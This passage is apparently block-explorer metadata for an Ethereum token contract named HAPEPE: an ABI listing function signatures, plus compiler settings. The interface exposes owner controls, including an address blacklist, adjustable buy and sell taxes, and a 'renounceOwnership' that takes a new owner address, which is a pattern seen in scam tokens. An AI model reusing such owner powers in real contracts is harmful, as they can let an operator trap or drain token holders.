\"inputs\":[],\"name\":\"EndTime30\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLiquidityTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newMarketingTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newTeamTax\",\"type\":\"uint256\"}],\"name\":\"ManageBuyTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLiquidityTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newMarketingTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newTeamTax\",\"type\":\"uint256\"}],\"name\":\"ManageSellTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_feeTXtime\",\"type\":\"uint256\"}],\"name\":\"UPfeeTXtime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalTaxIfBuying\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalTaxIfSelling\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_walletMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"authorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"enableDisableWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"endtime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"isAuthorized\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBlocked\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"manage_blacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_marketingFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_devFeeReceiver\",\"type\":\"address\"}],\"name\":\"setFeeReceivers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsWalletLimitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"setMaxTxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLimit\",\"type\":\"uint256\"}],\"name\":\"setNumTokensBeforeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setSwapAndLiquifyByLimitOnly\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"setSwapAndLiquifyEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLimit\",\"type\":\"uint256\"}],\"name\":\"setWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"unauthorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"waiveOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "HAPEPE", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cfcac0d7caa8a1c7da4b4e5391c42a8da852cda7faf3958737fa70a9a5445a95"}